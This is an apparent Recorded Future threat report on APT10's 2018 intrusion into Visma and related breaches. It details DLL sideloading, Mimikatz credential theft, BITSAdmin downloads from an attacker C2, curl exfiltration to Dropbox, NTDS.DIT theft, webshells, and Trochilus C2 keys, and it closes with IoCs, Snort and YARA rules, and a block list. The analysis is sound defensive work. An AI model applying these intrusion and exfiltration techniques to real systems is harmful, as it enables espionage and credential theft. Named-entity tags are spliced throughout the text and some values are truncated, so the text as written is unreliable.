[GPE] the [GPE] United [GPE] States . About VismaVisma offers software and services that simplify and digitize core business processes in the private and public sector . The [GPE] Visma group operates across the entire [LOC] Nordic region along with [GPE] Benelux , Central , and [LOC] Eastern [LOC] Europe . With [CARDINAL] 8,500 employees , [CARDINAL] more [CARDINAL] than [CARDINAL] 850,000 customers , and a net revenue of [MONEY] NOK [MONEY] 8,537 [MONEY] million ( [MONEY] approximately $ [MONEY] 1 [MONEY] billion [MONEY] USD ) in [DATE] 2017 , [GPE] Visma is one of [LOC] Europe \u2019s leading software companies . [ORG] Intrusion [ORG] OverviewRecorded [ORG] Future \u2019s [ORG] Insikt [ORG] Group has actively tracked APT10 for [DATE] several [DATE] years , focusing specifically on the group \u2019s targeting of MSPs and global internet infrastructure providers since the Operation Cloud Hopper report in [DATE] 2017 . We were particularly interested in identifying whether any customers of the targeted MSPs were subsequently compromised by APT10 , given their potential access through compromised [ORG] MSP networks . In [DATE] September [DATE] 2018 , [CARDINAL] one of our clients ( and a supplier as well ) , [GPE] Visma , reached out to us for assistance in investigating an incident uncovered on their network following a breach notification by [PERSON] Rapid7 . Visma provided us with malware samples and network logs from the event . Analysis of the data revealed that [ORG] Visma \u2019s [ORG] Citrix infrastructure had been probed and subsequently accessed using stolen credentials [DATE] as [DATE] early [DATE] as [DATE] August 17 , [DATE] 2018 . This was followed by an initial exploitation , network enumeration , and malicious tool deployment on various [GPE] Visma endpoints within [DATE] two [DATE] weeks of initial access . The theft of enterprise login credentials was conducted within [DATE] two [DATE] and [DATE] a [DATE] half [DATE] weeks of initial access . Recorded Future | www.recordedfuture.com | CTA-2019 - 0206 | 7On [DATE] August [DATE] 30 , [DATE] 2018 , APT10 deployed their [ORDINAL] first modified version of [GPE] Trochilus that had its [CARDINAL] C2 communications encrypted using [ORG] Salsa20 and RC4 - encrypted [GPE] Trochilus variant seen in the wild . This sample , similar to other [NORP] Trochilus samples , was deployed using a [ORG] DLL sideloading method utilizing [CARDINAL] three files , uploaded to the same folder on the victim machine as identified in [GPE] US - CERT advisory TA17- 117A ( last revised on [DATE] December 20 , [DATE] 2018 ) . This method involves the use of a legitimate binary ( File 1 ) used to load a malicious [ORG] DLL ( File 2 ) . The malicious [ORG] DLL is renamed to match the name of an expected [ORG] DLL to be loaded by the executable . The malicious [ORG] DLL then decrypts and decompresses shellcode contained within [CARDINAL] a [CARDINAL] third file placed by the attackers in the same temporary folder . The configuration file then loads the [NORP] Trochilus payload into memory by injecting it into a valid system process . This method of malicious payload installation is a well - documented [ORG] TTP of APT10.The attackers used [PERSON] Mimikatz ( [PERSON] pd.exe ) to enable credential theft and made use of scheduled tasks via the Microsoft BITSAdmin utility to transfer files from their [CARDINAL] C2 to the [GPE] Visma network . The attackers preferred to upload their malicious tooling to the C:\\ProgramData\\ temp or C:\\ProgramData\\media directories and executed commands using batch files ( x.bat ) . A full list of the filenames of the suspected attacker tooling can be found in the report appendices . [GPE] BITSAdmin example commands used by the attackers . In order to exfiltrate the compromised data , the attackers employed custom malware that used [PERSON] Dropbox as its C2 . They also used WinRAR and cURL for Windows , both often renamed , to compress and upload the exfiltrated files from the [GPE] Visma network to the [ORG] Dropbox API.Our research partner [PERSON] Rapid7 investigated the [ORG] Dropbox use and found that the attackers had used the same account to store exfiltrated data from a global apparel company . They also identifiedRecorded Future | www.recordedfuture.com | CTA-2019 - 0206 | 8broadly similar TTPs being used in the attack against a [GPE] U.S. law firm specializing in intellectual property law . The firm has a dedicated [GPE] China practice aimed at assisting [NORP] Chinese companies entering the [GPE] U.S. market . [PERSON] Rapid7 \u2019s investigation revealed the law firm was [ORDINAL] first targeted in [DATE] late [DATE] 2017 , followed by the apparel company [DATE] a [DATE] few [DATE] months [DATE] later , and finally , the [GPE] Visma attack in [DATE] August [DATE] 2018 . In [CARDINAL] one of the attacks , [PERSON] Rapid7 identified the attackers escaping a [PRODUCT] Citrix application in order to run the payload script on the victim desktop . Interestingly , in all [CARDINAL] three attacks , the targeting of [PRODUCT] Citrix remote desktops was a common thread . Additionally , the same [ORG] DLL sideloading technique observed in the [GPE] Visma attack was used , and many of the tools deployed by the attackers shared naming similarities as well ( [DATE] 1.bat , cu.exe , [ORG] ss.rar , r.exe , [PERSON] pd.exe ) . Most interestingly , [PERSON] Rapid7 observed the use of the Notepad++ updater gup.exe as a legitimate executable to sideload a malicious [ORG] DLL ( libcurl.dll ) in order to deploy a variant of the [ORG] UPPERCUT backdoor ( also known as ANEL ) . APT10 used this approach to deploy [ORG] UPPERCUT when targeting [NORP] Japanese corporations in [DATE] July 2018.The [FAC] Visma [FAC] AttackAPT10 actors gained initial access to the [GPE] Visma network [DATE] around [DATE] August 17 , [DATE] 2018 . Examination of network logs revealed an employee \u2019s credentials were stolen and used to authenticate to the network outside of her [TIME] normal [TIME] working [TIME] hours . While we are confident that APT10 actors gained access to the [GPE] Visma network in [DATE] August using stolen employee [PRODUCT] Citrix remote desktop credentials , it is not clear how or when these credentials were initially compromised . Throughout [DATE] August [DATE] 2018 , the APT10 actors regularly logged in to the [GPE] Visma network via accessible [PRODUCT] Citrix servers using [CARDINAL] two valid user accounts . The times of the logins were consistent with a [ORG] GMT+8 timezone , indicative of typical [GPE] Tianjin , [GPE] China working hours . On each occasion , the logins were from [CARDINAL] one of [CARDINAL] eight VPN endpoints Based on information in [ORG] WHOIS registration records , the website for the company is vpnconsumer.com , which is a nondescript landing page only containing the abuse contact details and a physical address in [GPE] Panama . [ORG] BGP routing information shows that the organization manages 44/24 subnets hosted around the world , many of which resolve to low - cost [ORG] VPN services , such as ExpressVPN.Insikt Group analysis of network metadata to and from the [ORG] VPN endpoint [ORG] IPs revealed consistent connectivity to Citrix - hosted infrastructure from [CARDINAL] all [CARDINAL] eight [ORG] VPN endpoint [ORG] IPs starting on [DATE] August 17 , [DATE] 2018 \u2014 the same date the [ORDINAL] first authenticated login to [GPE] Visma \u2019s network was made using stolen credentials . After [DATE] almost [DATE] two [DATE] weeks , on [DATE] August [DATE] 30 , [DATE] 2018 , APT10 attackers used their access to the network to move laterally and made their [ORDINAL] first deployment of an RC4- and Salsa20 - encrypted variant of the [PRODUCT] Trochilus malware using a previously associated [ORG] DLL sideloading technique . [CARDINAL] Two separate infection chains leveraging this specific [ORG] DLL sideloading technique were identified on the [GPE] Visma network using legitimate known good binaries that had [ORG] DLL search - order path issues . This means that APT10 actors had [CARDINAL] two separate access points into the [GPE] Visma network . Infection Chain 1 : [DATE] August [DATE] 30 , [CARDINAL] 2018Once on the [GPE] Visma network , APT10 attackers used the Microsoft BITSAdmin CLI tool to copy malicious tools from a suspected attacker - controlled [CARDINAL] C2 hosted on [CARDINAL] 173.254.236[.]158 to the \\ ProgramData\\temp\\ directory on the infected host . Recorded Future | www.recordedfuture.com | CTA-2019 - 0206 | 10The copied files included:\u2022 A legitimate binary for the uninstaller for [ORG] PDF printing application [ORG] PDF [ORG] - Xchange [ORG] 2011 [ORG] Lite [ORG] DE , renamed from unins000.exe to CASTSP.exe ( [CARDINAL] f6e0f076e27391a6e6eb23f23f77c this file sideloaded and ran version.dll , which in turn decrypted and decompressed the encrypted shellcode and injected the [NORP] Trochilus payload into memory . CASTSP.exevcruntime140.dllRUTLFJPBTJSFZZAOJTYPTrochilusLegitimate binary for [ORG] PDF [ORG] - Xchange [ORG] 2011 [ORG] Lite [ORG] DE uninstaller , unins000.exe , renamed to CASTSP.exe by attackersInfection Chain 1.CASTSP.exe executed which sideloads version.dllversion.dll decrypts shellcode and injects [NORP] Trochilus payload into memoryTrochilus variant deployed in memory , with [CARDINAL] C2 communications encrypted using [WORK_OF_ART] XOR , RC4 , and Salsa20Infection Chain 2 : [DATE] September 4 , [DATE] 2018A [DATE] few [DATE] days [DATE] later , APT10 used an almost identical approach used during [ORG] Infection [ORG] Chain [ORG] 1 to deploy [NORP] Trochilus onto another part of [GPE] Visma \u2019s network . While the deployed [ORG] DLL and the encrypted shellcode were named differently , the underlying method of malware installation was the same as [PRODUCT] Infection [PRODUCT] Chain [PRODUCT] 1 . The files remotely copied into C:\\ProgramData\\temp\\ using BITSAdmin included:\u2022 Another dropper renamed to \u201c CASTSP.exe \u201d that this time was a legitimately signed [ORG] Microsoft [ORG] Visual [ORG] Studio binary [CARDINAL] TailoredDeploy.Host.exe ( also known as [ORG] TailoredDeploy.exe ) 28a3db3998eecb)The execution method was identical : CASTSP.exe sideloaded and ran vcruntime140.dll , which decrypted and decompressed the encrypted shellcode configuration and injected the [NORP] Trochilus payload into a system process in - memory on the host machine.CASTSP.exevcruntime140.dllRUTLFJPBTJSFZZAOJTYPTrochilusCASTSP.exe executed which sideloads vcruntime140.dllvcruntime140.dll decrypts shellcode and injects [NORP] Trochilus payload into memoryTrochilus variant deployed in memory , with [CARDINAL] C2 communications encrypted using [WORK_OF_ART] XOR , RC4 , and Salsa20Legitimate binary for [ORG] Microsoft [ORG] Visual [ORG] Studio , [CARDINAL] TailoredDeploy.Host.exe , renamed to CASTSP.exe by attackersInfection [CARDINAL] Chain [CARDINAL] 2.Malware [GPE] AnalysisThe malware sets used for both infection chains are nearly identical both in infection method and code structure . Because the malware for both infection chains were so similar , it is only necessary to include the in - depth analysis for [CARDINAL] one chain here , so we focused on [PRODUCT] Infection [PRODUCT] Chain [PRODUCT] 1 . It included the binaries below:\u2022 CASTSP.exe : A valid and signed application that utilizes DLLsideloading to execute the malicious [ORG] DLL , \u201c version.dll\u201d\u2022 [ORG] Version.dll : [ORG] Main functionality of \u201c [ORG] Version.dll \u201d is to decrypt andexecute the Trochilus payload\u2022 CZYSOYKPOIKKZGUFOIUI : DES - encrypted [PRODUCT] Trochilus payloadTrochilus [ORG] ImplantThe [NORP] Trochilus loader , version.dll , has [CARDINAL] four entry points , as shown below . The malicious entrypoint called by CASTSP.exe is DllEntryPoint . Recorded Future | www.recordedfuture.com | CTA-2019 - 0206 | [DATE] 12After version.dll runs , it loads the file [ORG] CZYSOYKPOIKKZGUFOIUI into memory . The file \u201c [ORG] CZYSOYKPOIKKZGUFOIUI \u201d is [CARDINAL] 387,094 bytes of binary code that is not human - readable . After the file is loaded , the next function , sub_6a351000 , starts the decryption routine for [ORG] CZYSOYKPOIKKZGUFOIUI . The file is DES- encrypted and the key can be identified being loaded into memory at the start of the decryption routine . Recorded Future | www.recordedfuture.com | CTA-2019 - 0206 | [CARDINAL] 13Once the payload is decrypted , version.dll creates a new process in a suspended state and writes the [NORP] Trochilus payload into the suspended process . Next , version.dll resumes the process , executing the [NORP] Trochilus payload . [NORP] Trochilus attribution . [ORG] Recorded [ORG] Future | www.recordedfuture.com | CTA-2019 - 0206 | 14This variant of [GPE] Trochilus is significantly different from some of the reported variants.1 The [CARDINAL] C2 infrastructure , network communications , and encryption are different from prior versions , but the code similarities and the use of [ORG] DLL sideloading demonstrate that this is just another variant of [GPE] Trochilus . [ORDINAL] First , the libraries below are included in the [PRODUCT] Trochilus variant and are known to be a part of the source code upon which [PRODUCT] Trochilus is based on.\u2022 SelfDestruction.cpp\u2022 MySocket.cpp\u2022 CommManager.cpp\u2022 Common.cpp\u2022 [NORP] Main.cpp\u2022 Manager.cpp\u2022 [DATE] ServiceManager.cpp\u2022 [DATE] TCPComm.cpp\u2022 UDPComm.cppSecond , the unencrypted [CARDINAL] C2 beacon , _ msgid.23.__serial.0.clientid . xxxxxxxxxxxxxxx , is a well - defined component of the [NORP] Trochilus source code . The capabilities of [NORP] Trochilus are well documented in other research reports , but the C2 infrastructure for this variant uses a combination of [ORG] XOR , RC4 , and Salsa20 , which is different from what has previously been reported for Trochilus . [ORG] Command and [ORG] Control [ORG] InfrastructureThe C2 domain www.miphomanager[.]com is hardcoded , and after a successful [ORG] DNS request for the [ORG] IP address , the [NORP] Trochilus implant will use that [ORG] IP address for communication.1 url url com/2017/05/09 / carbon - black - threat - research - dissects - red - leaves - malware - leverages - dll- side - loading/ , url source - rat.htmlRecorded Future | www.recordedfuture.com | CTA-2019 - 0206 | 15The encoding and encryption routines used in this variant are different from other variants and use [CARDINAL] three stages of encryption . Other variants have typically used [PERSON] XOR encoding with RC4 encryption to obfuscate C2 communication . Stage [CARDINAL] 1 : Rolling XOR FunctionThe [ORDINAL] first stage is a simple rolling XOR function . The rolling [PERSON] XOR key is computed by taking [CARDINAL] two initial values , [PERSON] Constant [PERSON] 1 and [PERSON] Constant [PERSON] 2 , and adding them together . The result is then divided against the divisor 0xff . The remainder of this result is used as the XOR key . On the [ORDINAL] second iteration , [PERSON] Constant [PERSON] 1 is now saved as [PERSON] Constant [PERSON] 2 , and [PERSON] Constant [PERSON] 2 becomes the remainder from the previous operation . They are added together and again divided by the divisor 0xff to produce the next [WORK_OF_ART] XOR key . This process repeats until the end of the cleartext string . A Python script is provided below showing this encoding function . Recorded Future | www.recordedfuture.com | CTA-2019 - 0206 | [CARDINAL] 16Our analysis revealed that the \u201c _ _ msgid.23 . \u201d cleartext string below was sent to the [WORK_OF_ART] XOR function above . Stage 2 : RC4 EncryptionThe resulting data then goes to the [ORDINAL] second stage , which is RC4 encryption using the hard - coded string NASDKJF7832Hnkjsadf87 [CARDINAL] 8UHds89iujkhNHKJDHJDH8UIYE98uihwjshewde8w . The main routine shown below takes the key and then sends it to the function sub_B49252 , which initializes the key - scheduling algorithm ( KSA ) and pseudo - random generation algorithm ( PRGA ) , which are the [CARDINAL] two key components of RC4 encryption . [ORG] Recorded [ORG] Future | www.recordedfuture.com | CTA-2019 - 0206 | 17Stage 3 : [ORG] Salsa20 [ORG] EncryptionFor the final phase , the resulting data from the RC4 encryption is then encrypted again , this time with Salsa20 . Salsa20 is another stream cipher that encrypts data in 64 [QUANTITY] - byte blocks . Salsa20 uses a secret key and nonce to initialize the encryption . These values are hard - coded and [PERSON] are:\u2022 [PERSON] Secret Key : [PERSON] 0x1,0x2,0x3,0x4,0x5,0x6,0x7,0x8,0x9,0xA,0xB,0xC,0xD,0xE,0xF,0x10\u2022 Nonce : [CARDINAL] 0x65,0x66,0x67,0x68,0x69,0x6A,0x6B,0x6C ( \u201c efghijkl\u201d)Recorded Future | www.recordedfuture.com | CTA-2019 - 0206 | 18After the message is encrypted , it is then sent via an [ORG] HTTP [ORG] POST to the C2 host , which in this case is the domain www.miphomanager [ . ] com . The HTTP headers are provided in the figure below . Recorded Future | www.recordedfuture.com | CTA-2019 - 0206 | [CARDINAL] 19InfrastructureDNS log data revealed that requests were made for the malicious Trochilus C2 domain , www.miphomanager[.]com , [DATE] as [DATE] early [DATE] as [DATE] August [DATE] 30 , [DATE] 2018 \u2014 [DATE] only [DATE] two [DATE] weeks after [GPE] Visma was initially compromised on [DATE] August 17 , [DATE] 2018 . This slight delay may point to the handing over of active exploitation duties to other operator(s ) in a multi - team APT10 effort within [ORG] the [ORG] Ministry [ORG] of [ORG] State [ORG] Security for the attack . According to [ORG] WHOIS information , the malicious \" miphomanager \" domain was registered with a relatively small [GPE] Bahamas - based domain registrar , internet.bs . This registrar is widely noted to host a disproportionate number of rogue or malicious websites , with the registrar aggressively marketing itself as an \u201c offshore \u201d registrar . Other examples of malicious infrastructure registered with internet.bs include domains for [GPE] APT28 \u2019s VPNFilter malware campaign and the registration of the cyber - berkut[.]org domain that was affiliated with the pro [NORP] - [NORP] Russian and potentially [NORP] Russian state - linked threat actor [PRODUCT] CyberBerkut . The registrant organization name was privacy protected using [ORG] Whois [ORG] Privacy [ORG] Corp , and the registered name servers for the malicious C2 were listed as:\u2022 Ns - canada.topdns[.]com\u2022 Ns [PERSON] - uk.topdns[.]com\u2022 Ns [PERSON] - usa.topdns[.]comInternet.bs and the name servers listed above were noted in the registration of a malicious C2 used in a [ORG] KHRAT campaign targeting [GPE] Cambodia . [ORG] KHRAT is a backdoor trojan purported to be used with the [GPE] China - linked cyberespionage group DragonOK.All [CARDINAL] three name servers appear in [ORG] Recorded [ORG] Future with an unusual risk rating as they appear in the \u201c [WORK_OF_ART] Bambenek [WORK_OF_ART] Consulting [ORG] C&C [ORG] Nameserver [ORG] Blocklist \u201d threat list , because of their prevalence in being associated with a [GPE] Zeus - based banking trojan , [PERSON] Sphinx . Recorded Future | www.recordedfuture.com | CTA-2019 - 0206 | 20Credential Harvesting and ExfiltrationDuring our investigation , we also found evidence of a legitimate decompression utility typically packaged with [PERSON] Java named \u201c unpack200.exe \u201d being executed on the [GPE] Visma network . This utility sideloaded [WORK_OF_ART] Mimikatz ( [WORK_OF_ART] pd.exe ) and enabled credential theft from [GPE] Visma users . Interestingly , the same combination of unpack200 . exe to deploy [PERSON] Mimikatz was used by the same attackers in both the apparel company and U.S.-based law firm breaches . Using the newly acquired credentials , the attacker accessed [ORG] Visma \u2019s [ORG] Microsoft [ORG] Active [ORG] Directory domain controller , deployed [PRODUCT] Trochilus , and made a copy of the \u201c NTDS.DIT \u201d database file containing [ORG] Active [ORG] Directory data for [GPE] Visma \u2019s corporate network , including password hashes for all users in the domain . The NTDS.DIT file and accompanying stolen data was then packaged up using a renamed WinRAR executable ( r.exe ) that was transferred across by the attacker who then used cURL for Windows ( renamed to \u201c CU.exe \u201d ) to upload the exfil to content.dropboxapi.com . The [ORG] RAR files followed a naming convention of a short run of repeating characters ( for example , kkk.rar , [ORG] ss.rar , pp.rar , dds.rar , gggg.rar , etc).Rapid7 research revealed the exfiltrated content from [GPE] Visma was uploaded to a [ORG] Dropbox account that contained files from another incident related to the compromise of an international apparel company that they were investigating . [GPE] US - Based Law Firm AttackIn [DATE] late [DATE] 2017 , [PERSON] Rapid7 responded to a breach at a U.S.-based law firm . The attacker [ORDINAL] first gained access to the victim environment through [PRODUCT] Citrix servers . Once inside the victim network , the attacker deployed their own customized malware and also used known good binaries that have [ORG] DLL search order hijacking issues in order to perform [ORG] DLL sideloading to execute customized versions of [LOC] Mimikatz in order to retrieve passwords . The filename for the custom malware was legitimate [ORG] Symantec [ORG] Security [ORG] Submission [ORG] Engine [ORG] Update [ORG] Module binary . The custom malware also would have a [ORG] DLL in the same stagingRecorded Future | www.recordedfuture.com | CTA-2019 - 0206 | 21directory and a randomized [CARDINAL] 15 - character uppercase and lowercase alpha character set filename without an extension that contained the shellcode . The attacker used unpack200.exe ( MD5 : [CARDINAL] 6807be8466955b afffa568b6da0e785c ) , a decompression program that comes with [PERSON] Java [PERSON] 8 and their copy of [PERSON] Mimikatz was placed into MSVCR100.DLL ( MD5 : c8ea12ee884f274ca35fa54a073 df130).These methods of initial ingress into the victim networks and the method of obtaining passwords remained consistent TTPs across all victims . The [ORG] DLL sideloading technique can evade application whitelisting and antivirus software . However , if deployed , systems that perform process.start creation would log the command line being passed to the binary and could be reviewed , and then signatures created that look for the common flags could be passed to [PERSON] Mimikatz . The attacker would also move laterally by mounting the remote drive on a system , copying \u201c 1.bat \u201d to it , use task scheduler to execute , and then delete the batch script . In order to perform exfiltration of the stolen data , the attacker used common file compression utilities ( rar.exe ) to create archives of the information they intended to exfiltrate , and then used common command line - based web clients ( curl.exe ) to transfer the stolen data to a cloud - based storage provider ( Dropbox ) . This [ORG] TTP for data exfiltration remained consistent across all victims . To maintain access to the victim network from the external public internet , the attacker deployed password - protected ASP eval webshells \u201c iisstart.aspx , \u201d SHA256 : 5c64d5fac41 ) within the client environment in order to maintain access.(FilenameServer - side ASPX payload of the China Chopper webshell . ( Source : Rapid7)This resembled the server - side ASPX payload of the [ORG] China [ORG] Chopper webshell documented previously . Uploads to [ORG] VirusTotal in [DATE] late [DATE] August [DATE] 2018 resembling the same filename , iisstart.aspx , indicate the deployed webshell was likely a version of the [ORG] China [ORG] Chopper webshell known to have been used by several [NORP] Chinese threat actors . Recorded Future | www.recordedfuture.com | CTA-2019 - 0206 | 22The attacker also used TeamViewer in order to maintain remote access to compromised systems within the victim environment . [ORG] International [ORG] Apparel [ORG] Company [ORG] AttackIn [DATE] early [DATE] 2018 , [PERSON] Rapid7 identified that the attackers compromised an apparel company , based upon detections and intelligence gathered from the U.S.-based law firm breach . The attacker gained access to the victim \u2019s internet - accessible [PRODUCT] Citrix systems and authenticated to them from networks associated with low - cost VPN providers owned by [ORG] VPN [ORG] Consumer [ORG] Network . [PERSON] Rapid7 again observed the attackers dropping payloads named \u201c ccSEUPDT.exe . \u201d The attackers used identical TTPs for executing malware and [PERSON] Mimikatz as observed before , by using [ORG] DLL sideloading with known good binaries that had [ORG] DLL search order path issues . The attackers used the Notepad++ [PERSON] Java archive decompression utility unpack200.exe from \u201c coInst.exe , \u201d and [ORG] Norton [ORG] Identity [ORG] Safe [ORG] binary CASRTSP . exe binaries were used files ba575 ) . [PERSON] Rapid7 reviewed malware discovered in the victim \u2019s environment and found implants that used [PERSON] Dropbox as the C2 . The attackers used the same method of lateral movement by mounting the remote drive on a system , copying 1.bat to it , using task scheduler to execute the batch script , and finally , deleting the batch script.load malwarelibcurl.dlltofrom DLLFor exfiltration of stolen data , the attacker used WinRAR and renamed \u201c rar.exe \u201d to \u201c r.exe \u201d to create archives , upload them with \u201c curl.exe \u201d ( renamed to \u201c c.exe \u201d ) , and again , use the cloud storage provider [PERSON] Dropbox . [PERSON] Rapid7 discovered that additional data was placed into the [ORG] Dropbox accounts under control of the attacker during the compromise and was able to attribute data that was placed into it as being owned by [GPE] Visma . Rapid7 then provided a breach notification to [GPE] Visma to alert them to this compromise in [DATE] September 2018.Recorded Future | www.recordedfuture.com | CTA-2019 - 0206 | 23OutlookWe identified [CARDINAL] three victims of cyberespionage operations since [DATE] late [DATE] 2017 across the managed IT service provider , retail , and legal sectors . The targeted sectors vary significantly , indicating a wide scope of targeting for the group . We assess with high confidence that the attacks were conducted by [NORP] Chinese MSS threat actor [ORG] APT10 , based on the evidence outlined in this report , summarized below:1 . The use of a variant of the [PRODUCT] Trochilus malware . While the variant has not been noted publicly previously , [PRODUCT] Trochilus is widely used by APT10.2 . The use of legitimate binaries to sideload malicious [ORG] DLLsthat decrypt and decompress shellcode configuration files containing a Trochilus payload.3 . The use of Notepad++ updater ( filename \u201c gup.exe \u201d ) to loadmalicious [ORG] DLL ( libcurl.dll ) in the deployment of the APT10 backdoor , UPPERCUT.4 . Extensive use of command - line tools including , but not limited to , [PERSON] Mimikatz , cURL for Windows , [GPE] BITSAdmin , and WinRAR , to perform actions on - host.5 . The targeting of a [NORP] Norwegian [ORG] MSP , which enabled potential access to an extensive customer base . We believe that the APT10 targeting of [GPE] Visma is an extension of their [DATE] 2017 Cloud Hopper operation ( which victimized some of the world \u2019s largest MSPs ) and has continued into [CARDINAL] late [CARDINAL] 2018.6 . The unauthorized access to [PRODUCT] Citrix remote desktop clients [ORG] atVisma using stolen credentials occured at times corresponding to [GPE] Tianjin working hours ( [ORG] GMT +8).We believe APT10 is the most significant known [NORP] Chinese state - sponsored cyber threat to global corporations . Their unprecedented campaign against MSPs , alleged to have included some of the largest MSPs in the world , in order to conduct secondary attacks against their clients , grants the [NORP] Chinese state the ability to potentially access the networks of [CARDINAL] hundreds ( if not [CARDINAL] thousands ) of corporations around the world . Recorded Future | www.recordedfuture.com | CTA-2019 - 0206 | [CARDINAL] 24This campaign brings to light further evidence supporting the assertions made by the [CARDINAL] Five Eyes nations , led by [ORG] the [ORG] U.S. [ORG] Department [ORG] of [ORG] Justice indictment against APT10 actors outlining the unprecedented scale of economic cyberespionage being conducted by [ORG] the [ORG] Chinese [ORG] Ministry [ORG] of [ORG] State [ORG] Security . Crucially , the variety of businesses targeted prove that these campaigns are being conducted against corporations across the commercial spectrum , aimed at undermining international norms in trade to erode the competitive advantage of companies that have invested heavily in patented technology . This report , alongside the plethora of other reporting on APT10 operations , acutely highlights the vulnerability of organizational supply chains . Often , [ORDINAL] third parties in the supply chain are less likely to adopt high - end , expensive security measures , and therefore offer an attacker a convenient access vector to target interconnected organizations . Also , the targeting of cloud providers exploits the trust companies place in the security of the cloud services they use . Based on publicly available information , we assess that this intrusion was conducted by the group that is known as APT10 . However , during the course of this investigation , we have had privileged conversations that lead us to believe that in the future , portions of what is now known as APT10 will be recategorized as a new group . There is insufficient data at this time to make that distinction . Network Defense RecommendationsRecorded Future recommends organizations conduct the following measures outlined in this section in conjunction with the advice published by [GPE] US - CERT2 and the [GPE] U.K. \u2019s [ORG] NCSC3 when defending against APT10 attempts to gain network access.\u2022 Configure your intrusion detection systems ( IDS ) , intrusionprevention systems ( [ORG] IPS ) , or any network defense mechanisms in place to alert on \u2014 and upon review , consider blocking illicit connection attempts from \u2014 the external [ORG] IP addresses and domains listed in [NORP] Appendix [NORP] A.2 url url IT - Service - Provider - Customers , url [CARDINAL] 3 url v2_0.pdfRecorded Future | www.recordedfuture.com | CTA-2019 - 0206 | 25\u2022 Implement the provided [ORG] SNORT rules in [NORP] Appendix B into your IDS and [ORG] IPS appliance and investigate any alerts generated for activity resembling the TTPs outlined in this report on APT10.\u2022 Conduct regular [ORG] Yara scans across your enterprise for the newrules listed in Appendix C and those listed in the official [GPE] U.S. and [GPE] U.K. government advisories listed above.\u2022 Consider blocking any connection attempts emanating from IPs resolving to \u201c [WORK_OF_ART] VPN [WORK_OF_ART] Consumer [WORK_OF_ART] Network \u201d ( listed in Appendix B ) and consider implementing a [ORG] VPN whitelisting policy based on approved vendors.\u2022 Detection of potential ASP eval webshells can be difficult , butcan be accomplished by deploying file integrity monitoring of the web root directories on all servers with a client environment.\u2022 Detection of exfiltration based on network flow data would bedifficult if the attacker chose to use the same cloud storage provider that the victim has standardized upon . However , if [ORG] SSL is proxied for monitoring , signatures can be created to identify this activity by checking the user agent or method of client header construction against the [ORG] Dropbox client applications themselves.\u2022 Ensure you have [ORG] DNS response policy zones enabled for yourenterprise . If so , consider detecting , alerting , and blocking requests for the nameservers below associated with the disproportionately malicious domain registrar internet.bs:\u2022 ns - uk.topdns.com\u2022 ns - usa.topdns.com\u2022 ns - canada.topdns.comRecorded Future | www.recordedfuture.com | CTA-2019 - 0206 | [CARDINAL] 26Appendix A \u2014 Indicators of Compromise 173.254.236[.]158 [DATE] 104.237.86[.]157 104.237.86[.]183 173.239.198[.]167 45.56.155[.]117 45.56.155[.]143 45.56.155[.]147 45.62.52[.]42 [CARDINAL] 45.62.52[.]7 [CARDINAL] 45.76.30[.]127Domains www.miphomanager[.]com www.llpsearch[.]comHashes MD5 : [PERCENT] C8ea12ee884f274ca35fa54a073df130 [PERCENT] - [PERCENT] MSVCR100.dll Chain 1 ) 2 ) [PERSON] at.exe [PERSON] at.exe.cfg [PERSON] at.exe.cfg [GPE] C.bat.cfg lg.exe.cfg ns.exe [ORG] ns.exe.cfg [ORG] CASRTSP.exeRecorded [ORG] Future | www.recordedfuture.com | CTA-2019 - 0206 | 27Appendix B \u2014 Network MonitoringRedLeaves Snort Rules sourced from [ORG] US [ORG] - [ORG] CERT alert TA17 [CARDINAL] - 117Aalert tcp any any - > any any ( msg : \u201c REDLEAVES Implant \u201d ; content : \u201c |00 00 [CARDINAL] 7a 8d [CARDINAL] 9b dc| \u201d ; offset : import \u201c pe\u201drule YARA_CN_APT10_Trochilus_RC4Salsa20_decrypted_payload description = \u201c Rule to identify [GPE] Trochilus variant configured with RC4+Salsa20 encrypted C2 comms used by APT10 in [DATE] 2018 \u201d author = \u201c [ORG] Insikt [ORG] Group , [ORG] Recorded [ORG] Future \u201d tlp = \u201c white \u201d date = \u201c 2019 [DATE] - [DATE] 01 [DATE] - [DATE] 10 \u201d $ s2 = \u201c www.miphomanager.com \u201d $ [MONEY] s3 = { [DATE] 01 [DATE] 02 03 04 05 06 07 08 [CARDINAL] 09 [CARDINAL] 0a 0b 0c [CARDINAL] 0d [CARDINAL] 0e [CARDINAL] 0f [CARDINAL] 10 } // Trochilus Salsa20 secret key $ [MONEY] s4 = { [DATE] 65 [DATE] 06 [DATE] 06 67 06 08 69 06 [CARDINAL] 0a 6b 06 0c } // Trochilus [PERSON] Salsa20 [PERSON] Nonce condition : ( uint16(0 ) = = [CARDINAL] 0x5a4d and filesize < 1000 [PERSON] KB and ( [CARDINAL] 2 of them ) ) description = \u201c Malicious [ORG] DLL vcruntime140.dll launched using benign CASTSP.exe to inject encrypted shellcode containing [PRODUCT] Trochilus payload \u201d author = \u201c [ORG] Insikt [ORG] Group , [ORG] Recorded [ORG] Future \u201d tlp = \u201c white \u201d date = \u201c 2019 [DATE] - [DATE] 01 [DATE] - 16 \u201d $ s1 = \u201c vcruntime140.dll \u201d fullword ascii $ s2 = \u201c AppPolicyGetProcessTerminationMethod \u201d fullword ascii $ s3 = \u201c CASTSP.exe \u201d fullword ascii $ s4 = \u201c operator co_await \u201d fullword ascii $ s5 = \u201c api - ms - win - appmodel - runtime - l1 - 1 - 2 \u201d fullword wide $ [MONEY] s6 = \u201c < ! < ( < 3<=<E < \u201d fullword ascii / * hex encoded string \u2018 > \u2019 * / $ [MONEY] s7 = \u201c [ORG] RUTLFJPBTJSFZZAOJTYP \u201d fullword ascii condition : uint16(0 ) = = [CARDINAL] 0x5a4d and filesize < 300 [PERSON] KB and description = \u201c Malicious [ORG] DLL version.dll launched using benign CASTSP.exe to inject encrypted shellcode containing [PRODUCT] Trochilus payload \u201d author = \u201c [ORG] Insikt [ORG] Group , [ORG] Recorded [ORG] Future \u201d tlp = \u201c white \u201d date = \u201c 2019 [DATE] - [DATE] 01 [DATE] - 16 \u201d $ s1 = \u201c AppPolicyGetProcessTerminationMethod \u201d fullword ascii $ s2 = \u201c CASTSP.exe \u201d fullword ascii $ s3 = \u201c ( p!xLq { Lp \u2018 Lq h*r!iLq h*t!`Lq h*u!tLq G+y!~Lq G+u!xLq G+q!zLq G+s!zLq Rich{Lq \u201c fullword ascii $ s4 = \u201c operator co_await \u201d fullword ascii $ s5 = \u201c api - ms - win - appmodel - runtime - l1 - 1 - 2 \u201d fullword wide $ [MONEY] s6 = \u201c [ORG] CZYSOYKPOIKKZGUFOIUI \u201d fullword ascii 